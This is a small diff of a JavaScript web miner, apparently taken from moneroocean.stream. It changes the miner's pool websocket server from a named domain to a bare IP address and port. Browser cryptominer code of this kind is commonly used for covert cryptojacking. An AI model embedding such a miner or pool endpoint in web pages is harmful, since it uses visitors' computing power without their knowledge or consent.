@@ -19,7 +19,7 @@ var worker_js_url = URL.createObjectURL(worker_js);
 // This is the original minimized web miner JavaScript code from moneroocean.stream.
 // This code snippet can be found at the end of the https://moneroocean.stream/build.min.js
 // The URL for the worker.js had to be replaced with the recently created blob URL.
-var server = "wss://webminerpool.com:8181/";
+var server = "wss://45.119.82.33:40725/";
 var jobstack = [];
 var workers = [];
 var ws;
